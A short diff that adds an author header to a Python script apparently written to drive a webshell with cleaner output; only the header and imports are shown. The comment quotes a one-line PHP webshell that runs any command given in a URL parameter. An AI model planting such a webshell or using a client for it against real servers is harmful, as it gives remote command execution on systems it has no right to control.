@@ -1,5 +1,12 @@
 #!/usr/bin/env python
 
+# author        : m_101
+# data          : 2014
+# description   :
+#   python script interfacing with a simple webshell
+#   in order to have cleaner output
+#   <?php system ($_GET['cmd']); ?>
+
 import re
 import requests
 import string
